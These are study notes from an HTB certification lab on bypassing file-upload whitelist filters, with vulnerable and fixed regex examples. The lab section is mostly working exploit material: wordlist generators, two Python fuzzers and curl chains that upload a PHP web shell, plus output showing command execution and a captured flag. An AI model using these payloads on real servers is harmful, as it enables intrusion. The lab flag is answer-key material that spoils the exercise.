---
tags: [CWES, HTB, technical-reference]
module: "File Upload Attacks"
source_file: "CWES.xmind"
---

# Whitelist Filters

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## more secure than a blacklist

### example code

- $fileName = basename($_FILES["uploadFile"]["name"]);  

  if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {  
  echo "Only images are allowed";  
  die();  
  }
  - The issue here lies within the regex, as it only checks whether the file name contains the extension
    - not if it actually ends with it
## Double Extensions

### (e.g. shell.jpg.php)

### Try to fuzz the upload form with This Seclists Wordlist to find what extensions are whitelisted by the upload form.

- uploaded
  - http://SERVER_IP:PORT/profile_images/shell.jpg.php?cmd=id
### Prevent

- strict regex pattern
  - if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
    - This pattern should only consider the final file extension
## Reverse Double Extension

### the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability.

- Apache2
  - configuration
    - <FilesMatch ".+\.ph(ar|p|tml)">
      - any file that contains the above extensions will be allowed PHP code execution, even if it does not end with the PHP extension
        - The web application may still utilize a blacklist to deny requests containing PHP extensions. Try to fuzz the upload form with the PHP Wordlist
          - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst>
            - visit the uploaded file
              - http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=id
## Character Injection

### The following are some of the characters we may try injecting:

- %20  
  %0a  
  %00  
  %0d0a  
  /  
  .\  
  .  
  …  
  :
  - Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the (%00), and store it as (shell.php)
- Windows server
  - injecting a colon (:) before the allowed file extension (e.g. shell.aspx:.jpg)
### bash script that generates all permutations of the file name

- Code: bash
  - for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do  
    for ext in '.php' '.phps'; do  
    echo "shell$char$ext.jpg" >> wordlist.txt  
    echo "shell$ext$char.jpg" >> wordlist.txt  
    echo "shell.jpg$char$ext" >> wordlist.txt  
    echo "shell.jpg$ext$char" >> wordlist.txt  
    done  
    done
    - run a fuzzing scan with Burp Intruder
## LAB

### prepare wordlist

- for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do  
  for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.shtml' '.htaccess' '.phar' '.inc'; do  
  echo "shell$char$ext.jpg" >> wordlist.txt  
  echo "shell$ext$char.jpg" >> wordlist.txt  
  echo "shell.jpg$char$ext" >> wordlist.txt  
  echo "shell.jpg$ext$char" >> wordlist.txt  
  done  
  done
  - prepare script.py
    - Code #1
      - send HTTP POST request with all the wordlist
      - script.py
        - import requests  
          import sys  
          import urllib.parse  

          def send_upload_request():  
          """Send the first request to upload the file"""  
          url = "http://94.237.120.112:54448/upload.php"  

          # Headers from the request  
          headers = {  
          'Host': '94.237.120.112:54448',  
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',  
          'Accept': '*/*',  
          'Accept-Language': 'en-US,en;q=0.5',  
          'Accept-Encoding': 'gzip, deflate, br',  
          'Referer': 'http://94.237.120.112:54448/',  
          'X-Requested-With': 'XMLHttpRequest',  
          'Content-Type': 'multipart/form-data; boundary=----geckoformboundary87af8edef60d06f2554ac059dcc2cf05',  
          'Origin': 'http://94.237.120.112:54448',  
          'DNT': '1',  
          'Connection': 'keep-alive',  
          'Sec-GPC': '1',  
          'Priority': 'u=0'  
          }  

          # Body from the request  
          body = """------geckoformboundary87af8edef60d06f2554ac059dcc2cf05  
          Content-Disposition: form-data; name="uploadFile"; filename="shell.php7/.jpg"  
          Content-Type: image/jpeg  

          <?<!-- -->php sys<!-- -->tem($_REQUEST['cmd']); ?>  
          ------geckoformboundary87af8edef60d06f2554ac059dcc2cf05--"""  

          print("Sending upload request...")  
          try:  
          response = requests.post(url, headers=headers, data=body, timeout=30)  
          print(f"Upload Response Status Code: {response.status_code}")  
          print(f"Upload Response Content: {response.text[:500]}")  # Show first 500 chars  
          return response  
          except Exception as e:  
          print(f"Error sending upload request: {e}")  
          return None  

          def send_curl_request(word):  
          """Send the second request (curl equivalent) with a specific word"""  
          url = f"http://94.237.120.112:54448/profile_images/{urllib.parse.quote(word, safe='')}?cmd=id"  

          # Simplified headers for the curl request  
          headers = {  
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',  
          'Accept': '*/*',  
          'Accept-Language': 'en-US,en;q=0.5',  
          'Connection': 'keep-alive'  
          }  

          print(f"\nTrying word: {word}")  
          print(f"URL: {url}")  

          try:  
          response = requests.get(url, headers=headers, timeout=30)  
          print(f"Response Status Code: {response.status_code}")  

          # Only show content if it exists and is not too large  
          if response.content:  
          content = response.text  
          if len(content) > 1000:  
          print(f"Response Content (truncated): {content[:1000]}...")  
          else:  
          print(f"Response Content: {content}")  
          else:  
          print("Response Content: (empty)")  

          return response  
          except Exception as e:  
          print(f"Error sending request: {e}")  
          return None  

          def generate_wordlist():  
          """Generate the wordlist as in your bash script"""  
          wordlist = []  
          chars = ['%20', '%0a', '%00', '%0d0a', '/', '.\\', '.', '…', ':']  
          exts = ['php', '.php2', '.php3', '.php4', '.php5', '.php6', '.php7', '.phps', '.phps', '.pht', '.phtm', '.phtml', '.pgif', '.shtml', '.htaccess', '.phar', '.inc']  

          for char in chars:  
          for ext in exts:  
          wordlist.append(f"shell{char}{ext}.jpg")  
          wordlist.append(f"shell{ext}{char}.jpg")  
          wordlist.append(f"shell.jpg{char}{ext}")  
          wordlist.append(f"shell.jpg{ext}{char}")  

          return wordlist  

          def main():  
          print("="*60)  
          print("Starting file upload and testing sequence")  
          print("="*60)  

          # Step 1: Send upload request  
          upload_response = send_upload_request()  

          if upload_response is None or upload_response.status_code != 200:  
          print("\nUpload failed or returned non-200 status. Continuing anyway...")  

          print("\n" + "="*60)  
          print("Starting curl request testing with wordlist")  
          print("="*60)  

          # Step 2: Generate wordlist and send requests  
          wordlist = generate_wordlist()  

          # Also add some additional variations as mentioned  
          additional_words = ['shell.php', 'shell.jpg', 'shell.png', 'shell.jpeg']  
          wordlist = additional_words + wordlist  

          print(f"Generated {len(wordlist)} words to test")  
          print("Starting tests...\n")  

          successful_responses = []  

          for i, word in enumerate(wordlist[:50]):  # Limit to first 50 for testing  
          print(f"\nTest {i+1}/{min(50, len(wordlist))}")  
          response = send_curl_request(word)  

          if response and response.status_code == 200 and len(response.text.strip()) > 0:  
          successful_responses.append((word, response))  
          print("✓ Found potential success!")  

          if len(successful_responses) >= 3:  # Stop after 3 successes  
          print("\nFound 3 successful responses. Stopping early.")  
          break  

          # Summary  
          print("\n" + "="*60)  
          print("TESTING SUMMARY")  
          print("="*60)  
          if successful_responses:  
          print(f"\nFound {len(successful_responses)} potentially successful requests:")  
          for word, response in successful_responses:  
          print(f"\nWord: {word}")  
          print(f"Status: {response.status_code}")  
          print(f"Content preview: {response.text[:200]}")  
          else:  
          print("\nNo successful responses found with the tested words.")  

          if __name__ == "__main__":  
          main()
      - curl each page and print the content
        - curl http://94.237.120.112:54448/profile_images/{word}?cmd=id
          - Word: shell%20.phtml.jpg  
            Status: 200  
            Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data)  
            Word: shell.phtml%20.jpg  
            Status: 200  
            Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data)
    - code #2
      - script.py
        - import argparse  
          import requests  
          import re  
          import urllib3  
          import time  
          from urllib.parse import quote  

          urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  


          def parse_raw_http(raw):  
          lines = raw.strip().splitlines()  

          # Request line  
          method, path, _ = lines[0].split(" ", 2)  

          headers = {}  
          i = 1  
          while i < len(lines) and lines[i].strip():  
          key, value = lines[i].split(":", 1)  
          headers[key.strip()] = value.strip()  
          i += 1  

          body = "\n".join(lines[i+1:])  
          return method, path, headers, body  


          def replace_filename(body, new_filename):  
          """  
          Replace filename="anything" with filename="new_filename"  
          """  
          return re.sub(  
          r'filename="[^"]+"',  
          f'filename="{new_filename}"',  
          body,  
          flags=re.IGNORECASE  
          )  


          def generate_get_urls(base_url, word):  
          """Generate multiple possible GET URLs for testing"""  
          urls = []  

          # Original word  
          urls.append(f"{base_url.rstrip('/')}/{word}")  

          # URL encoded version  
          try:  
          encoded = quote(word, safe='')  
          if encoded != word:  
          urls.append(f"{base_url.rstrip('/')}/{encoded}")  
          except:  
          pass  

          # Cleaned version (remove special chars)  
          clean_word = word  
          for char in ['%20', '%0a', '%00', '%0d0a', '/', '\\', ':', '…']:  
          clean_word = clean_word.replace(char, '')  
          if clean_word != word:  
          urls.append(f"{base_url.rstrip('/')}/{clean_word}")  

          return urls  


          def encode_body(body):  
          """  
          Encode body to bytes with proper encoding  
          """  
          # Try to detect encoding from Content-Type header  
          if 'Content-Type: multipart/form-data' in body:  
          # For multipart, we need to handle special characters  
          # Check if there are non-ASCII characters  
          try:  
          # Try UTF-8 first  
          return body.encode('utf-8')  
          except:  
          # Fall back to latin-1 with replacement  
          return body.encode('latin-1', 'replace')  
          else:  
          # Default to UTF-8  
          return body.encode('utf-8')  


          def main():  
          parser = argparse.ArgumentParser(description="HTTP upload filename fuzz + GET checker")  
          parser.add_argument("-f", "--post", required=True, help="Raw POST request file")  
          parser.add_argument("-w", "--wordlist", required=True, help="Wordlist file")  
          parser.add_argument("-g", "--get", required=True, help="Base GET URL (no filename)")  
          parser.add_argument("-c", "--cmd", default="id", help="Command to execute (default: id)")  
          parser.add_argument("-t", "--timeout", type=int, default=10, help="Timeout in seconds (default: 10)")  
          args = parser.parse_args()  

          # Read raw POST  
          with open(args.post, "r", encoding="utf-8", errors="ignore") as f:  
          raw_post = f.read()  

          method, path, headers, body_template = parse_raw_http(raw_post)  

          # Extract host from headers  
          host = headers.get("Host")  
          post_url = f"http://{host}{path}"  

          # Let requests handle Content-Length  
          headers.pop("Content-Length", None)  

          # Ensure proper encoding for headers if needed  
          for key in list(headers.keys()):  
          try:  
          headers[key] = headers[key].encode('latin-1').decode('latin-1')  
          except:  
          # If it fails, keep as is  
          pass  

          with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as wl:  
          words = [w.strip() for w in wl if w.strip()]  
          total_words = len(words)  

          print(f"[*] Starting fuzzing with {total_words} payloads")  
          print(f"[*] POST URL: {post_url}")  
          print(f"[*] GET Base URL: {args.get}")  
          print(f"[*] Command: {args.cmd}")  
          print("="*60)  

          success_count = 0  

          for i, word in enumerate(words, 1):  
          print(f"[*] Testing: {word} ({i}/{total_words})")  

          try:  
          # Upload file - handle encoding properly  
          fuzzed_body = replace_filename(body_template, word)  

          # Encode the body to bytes  
          body_bytes = encode_body(fuzzed_body)  

          # Create a new headers dict with proper encoding  
          request_headers = {}  
          for k, v in headers.items():  
          try:  
          # Ensure header values are ASCII  
          request_headers[k] = v.encode('ascii', 'ignore').decode('ascii')  
          except:  
          request_headers[k] = v  

          # Send POST request with bytes  
          post_resp = requests.request(  
          method,  
          post_url,  
          headers=request_headers,  
          data=body_bytes,  
          verify=False,  
          timeout=args.timeout  
          )  

          if post_resp.status_code != 200:  
          continue  

          # Wait for file processing  
          time.sleep(0.3)  

          # Test GET requests  
          get_urls = generate_get_urls(args.get, word)  

          found_success = False  
          for get_url in get_urls:  
          try:  
          # Add command parameter  
          if "?" in get_url:  
          test_url = f"{get_url}&cmd={args.cmd}"  
          else:  
          test_url = f"{get_url}?cmd={args.cmd}"  

          get_resp = requests.get(  
          test_url,  
          verify=False,  
          timeout=5  
          )  

          if get_resp.status_code != 404:  
          found_success = True  
          success_count += 1  
          print(f"\n[+] SUCCESS #{success_count}!")  
          print(f"Word: {word}")  
          print(f"Status: {get_resp.status_code}")  

          content = get_resp.text.strip()  
          if content:  
          # Clean up content  
          content = ' '.join(content.split())  
          if len(content) > 200:  
          content_preview = content[:200] + "..."  
          else:  
          content_preview = content  
          print(f"Content preview: {content_preview}")  
          else:  
          print(f"Content preview: (empty)")  

          print(f"URL: {test_url}")  
          print()  
          break  

          except requests.RequestException:  
          continue  

          if not found_success:  
          # Just show progress, no output for 404s  
          pass  

          except Exception as e:  
          print(f"[-] Error with {word}: {type(e).__name__}")  
          # Continue with next word instead of stopping  
          continue  

          print("="*60)  
          print(f"[*] Fuzzing complete!")  
          print(f"[*] Total tested: {total_words}")  
          print(f"[*] Successes found: {success_count}")  
          print("="*60)  


          if __name__ == "__main__":  
          main()
      - post.txt
        - POST /upload.php HTTP/1.1  
          Host: 94.237.59.242:54834  
          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0  
          Accept: */*  
          Accept-Language: en-US,en;q=0.5  
          Accept-Encoding: gzip, deflate, br  
          Referer: http://94.237.59.242:54834/  
          X-Requested-With: XMLHttpRequest  
          Content-Type: multipart/form-data; boundary=----geckoformboundarydb28e001436937d67fafbde00bb51c89  
          Content-Length: 254  
          Origin: http://94.237.59.242:54834  
          DNT: 1  
          Connection: keep-alive  
          Sec-GPC: 1  
          Priority: u=0  

          ------geckoformboundarydb28e001436937d67fafbde00bb51c89  
          Content-Disposition: form-data; name="uploadFile"; filename="{variable}"  
          Content-Type: image/jpeg  

          <?<!-- -->php sys<!-- -->tem($_REQUEST['cmd']); ?>  
          ------geckoformboundarydb28e001436937d67fafbde00bb51c89--
      - run it
        - python3 script.py -f post.txt -g http://94.237.59.242:54834/profile_images/ -w wordlist.txt
          - Word: shell..phar.jpg  
            Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data)  
            URL: http://94.237.59.242:54834/profile_images/shell..phar.jpg?cmd=id  
            Word: shell.phar..jpg  
            Status: 200  
            Content preview: uid=33(www-data) gid=33(www-data) groups=33(www-data)  
            URL: http://94.237.59.242:54834/profile_images/shell.phar..jpg?cmd=id
    - modify the script to run the commnad ?cmd=cat+/flag.txt
      - Trying word: shell.phtml%20.jpg  
        URL: http://94.237.120.112:54448/profile_images/shell.phtml%2520.jpg?cmd=cat+/flag.txt  
        Response Status Code: 200  
        Response Content: HTB{1_wh173l157_my53lf}
  - Manual CURL
    - curl -X POST "http://94.237.59.242:54834/upload.php" \  
      -H "Host: 94.237.59.242:54834" \  
      -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \  
      -H "Accept: */*" \  
      -H "Accept-Language: en-US,en;q=0.5" \  
      -H "Referer: http://94.237.59.242:54834/" \  
      -H "X-Requested-With: XMLHttpRequest" \  
      -H "Content-Type: multipart/form-data; boundary=----geckoformboundarydb28e001436937d67fafbde00bb51c89" \  
      -H "Origin: http://94.237.59.242:54834" \  
      -H "Connection: keep-alive" \  
      -H "Sec-GPC: 1" \  
      -H "Priority: u=0" \  
      -d $'------geckoformboundarydb28e001436937d67fafbde00bb51c89\r\nContent-Disposition: form-data; name="uploadFile"; filename="shell.phar:.jpg"\r\nContent-Type: image/jpeg\r\n\r\n<?<!-- -->php sys<!-- -->tem($_REQUEST["cmd"]); ?>\r\n------geckoformboundarydb28e001436937d67fafbde00bb51c89--' \  
      && sleep 1 \  
      && echo -e "\n\n[*] Testing uploaded file..." \  
      && curl "http://94.237.59.242:54834/profile_images/shell.phar:.jpg?cmd=id"
      - File successfully uploaded
        - [*] Testing uploaded file...  
          uid=33(www-data) gid=33(www-data) groups=33(www-data)
          - curl 'http://94.237.59.242:54834/profile_images/shell.phar:.jpg?cmd=id
            - uid=33(www-data) gid=33(www-data) groups=33(www-data)
